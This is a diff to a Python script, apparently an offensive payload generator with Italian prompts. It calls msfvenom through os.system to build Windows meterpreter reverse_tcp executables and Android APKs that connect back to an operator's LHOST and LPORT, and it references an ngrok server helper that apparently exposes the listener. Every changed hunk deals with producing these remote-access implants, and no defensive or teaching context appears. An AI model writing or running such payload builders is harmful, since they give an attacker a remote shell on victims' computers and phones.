@@ -246,15 +246,15 @@ def startNgrokServer():
 
 
 
-def createPayload(modulo, LHOST, LPORT, NAME, FORMAT):
+def createPayload(modulo, LHOST, LPORT, NAME):
     if modulo == 1:
         print("\n")
-        os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
+        os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {NAME}.exe")
     elif modulo == 2:
-        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
-    elif modulo == 3:
-        typeModule = input("\nMODULE > ")
-        os.system(f"sufo msfvenom -p {typeModule} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
+        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {NAME}.apk")
+   # elif modulo == 3:
+      #  typeModule = input("\nMODULE > ")
+     #   os.system(f"sufo msfvenom -p {typeModule} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
 
 
 
@@ -307,15 +307,16 @@ def setPayload():
             except ValueError:
                 print(f"\n {Fore.RED} [!] Formato non valido. Inserisci un numero intero.\n{Style.RESET_ALL}")
 
-        FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
+        
         NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")
 
         if choice == "1":
-            createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+            createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME)
         elif choice == "2":
-            createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+            createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME)
         elif choice == "3":
             module = input(f"\n Module {Fore.CYAN}> {Style.RESET_ALL}")
+            FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
             os.system(f"sudo msfvenom -p {module} LHOST={HOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
         elif choice == "99":
             break
